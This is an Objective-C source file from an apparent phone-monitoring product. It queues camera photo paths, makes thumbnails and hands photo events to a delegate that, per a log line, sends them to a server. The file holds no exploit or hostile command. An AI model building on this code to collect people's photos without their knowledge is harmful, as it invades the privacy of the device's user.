/**
 - Project name :  MediaCaptureManager
 - Class name   :  PhotoCapture
 - Version      :  1.0  
 - Purpose      :  For MediaCaptureManager Component
 - Copy right   :  14/2/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "PhotoCapture.h"
#import "FxSystemEvent.h"

#ifdef IOS_ENTERPRISE
#import "MediaInfo-E.h"
#else
#import "MediaInfo.h"
#endif

@implementation PhotoCapture

/**
 - Method name:initWithEventDelegate:andMediaThumbnailManager
 - Purpose: This method is used initialize PhotoCapture class
 - Argument list and description: aEventDelegate (EventDelegate),aMediaThumbnailDelegate(MediaThumbnailManager)
 - Return type and description: (id) PhotoCapture instance
*/

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate 
	andMediaThumbnailManager: (id <MediaThumbnailManager>) aMediaThumbnailManager {
    if (self = [super init]) {
		mPhotoCaptureQueue=[[NSMutableArray alloc]init];
		mEventDelegate=aEventDelegate;
		mMediaThumbnailManager=aMediaThumbnailManager;
		mIsBusy=NO;
    }
    return self;
}

/**
 - Method name:addPathToPhotoQueue:
 - Purpose: This method is used  to add photo path to the queue
 - Argument list and description: aPhotoPath (NSString)
 - Return type and description: No Return
 */

- (void) addPathToPhotoQueue: (NSString *) aPhotoPath {
	DLog (@"Add photo path:(%@) to the queue",aPhotoPath)
	[mPhotoCaptureQueue addObject:aPhotoPath];
}

/**
 - Method name:processPhotoCaptureQueue
 - Purpose: This method is used  to process Camera image thumbnail generation
 - Argument list and description: No Argument
 - Return type and description: No Return
 */

- (void) processPhotoCaptureQueue {
	if ([mPhotoCaptureQueue count] && !mIsBusy) {
		mIsBusy=YES;
		NSString *photoPath=[mPhotoCaptureQueue objectAtIndex:0];
		DLog (@"====>processPhotoCaptureQueue:%@",photoPath);
		
//		NSFileManager *fileManager = [NSFileManager defaultManager];
//		NSDictionary *fileAttributes = [fileManager attributesOfItemAtPath:photoPath error:nil];
//		NSUInteger oneMeg = 1020 * 1024;
//		NSUInteger sizeInMeg = [fileAttributes fileSize] / oneMeg;
//		// Check max file size 10 Mb
//		if (sizeInMeg > 10) {
		if (0) {
			// Create system event if media is too big
			FxSystemEvent *systemEvent=[[FxSystemEvent alloc] init];
			NSString *message = NSLocalizedString(@"kMediaEventTooBigCannotDeliver", @"");
			[systemEvent setMessage:message];
			[systemEvent setSystemEventType:kSystemEventTypeMediaEventMaxSizeReached];
			[systemEvent setDirection:kEventDirectionOut];
			[systemEvent setDateTime:[DateTimeFormat phoenixDateTime]];
			if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
				[mEventDelegate performSelector:@selector(eventFinished:) withObject:systemEvent];
			}
			[systemEvent release];
			
			[self removeProcessedPathFromPhotoCaptureQueue];
			mIsBusy = NO;
			[self performSelector:@selector(processPhotoCaptureQueue) withObject:nil afterDelay:0.1];
		} else {
            #ifdef IOS_ENTERPRISE
                PHFetchResult *fetchResult = [PHAsset fetchAssetsWithLocalIdentifiers:@[photoPath] options:nil];
                PHAsset *photoAsset = [fetchResult firstObject];
                if (photoAsset) {
                    [mMediaThumbnailManager createImageThumbnail:photoAsset delegate:self];
                }
                else {
                    [self performSelector:@selector(processPhotoCaptureQueue) withObject:nil afterDelay:0.1];
                }
            #else
                [mMediaThumbnailManager createImageThumbnail:photoPath delegate:self];
            #endif
		}
	}
}

/**
 - Method name:removeProcessedPathFromPhotoCaptureQueue
 - Purpose: This method is used  to remove processed camera image 
 - Argument list and description: No Argument
 - Return type and description: No Return
*/

- (void) removeProcessedPathFromPhotoCaptureQueue {
	if ([mPhotoCaptureQueue count]) {
		DLog (@"====>removeProcessedPathFromVideoCaptureQueue")
		[mPhotoCaptureQueue removeObjectAtIndex:0];
	}
}

#pragma mark MediaThumbnailManager Delegate Methods
/**
 - Method name:thumbnailCreationDidFinished:mediaInfo:thumbnailPath:
 - Purpose: This method is invoked when thumbnail processig is completed.
 - Argument list and description: aError (NSError),aMedia(MediaInfo ),aPaths(id)
 - Return type and description: No Return
 */

- (void) thumbnailCreationDidFinished: (NSError *) aError
							mediaInfo: (MediaInfo *) aMedia
						thumbnailPath: (id) aPaths {
	
	DLog (@"Camera Image thumbnail creation completed...");
	DLog (@"\n===================================\n");
	DLog (@"Media Length:%ld",(long)[aMedia mMediaLength]);
	DLog (@"Media Type:%d",[aMedia mMediaInputType]);
	DLog (@"Media Full Path:%@",[aMedia mMediaFullPath]);
	DLog (@"Media Size:%llu",[aMedia mMediaSize]);
	DLog (@"Thumbnail Length:%ld",(long)[aMedia mThumbnailLength]);
	DLog (@"Thumbnail Size:%llu",[aMedia mThumbnailSize]);
	DLog (@"Error Code:%ld",(long)[aError code]);
	DLog (@"Thumbnail Path(s):%@",aPaths);
	DLog (@"\n===================================");
	
	[self removeProcessedPathFromPhotoCaptureQueue];
	
	if ([aError code]==kMediaThumbnailOK) {
		FxMediaEvent *mediaEvent=[[FxMediaEvent alloc]init];
		FxThumbnailEvent *tEvent=[[FxThumbnailEvent alloc]init];
		[tEvent setFullPath:(NSString *)aPaths];
		[tEvent setEventType:kEventTypeCameraImageThumbnail];	 
		[tEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[tEvent setActualSize:[aMedia mMediaSize]];
		[tEvent setActualDuration:[aMedia mMediaLength]];
		[mediaEvent addThumbnailEvent:tEvent];
		[tEvent release];
		[mediaEvent setFullPath:[aMedia mMediaFullPath]];
		[mediaEvent setEventType:kEventTypeCameraImage];
		[mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		//=============================SEND PHOTO EVENT==============================================
		if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent withObject:self];
			DLog (@"Send Photo event to the server")
		}
		[mediaEvent release];
	} 
	else {
		DLog (@"[aError code] = %ld", (long)[aError code]);
	}
	mIsBusy=NO;
	[self performSelector:@selector(processPhotoCaptureQueue) withObject:nil afterDelay:0.1];
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

- (void) dealloc {
	[mPhotoCaptureQueue release];
	[super dealloc];
}
@end
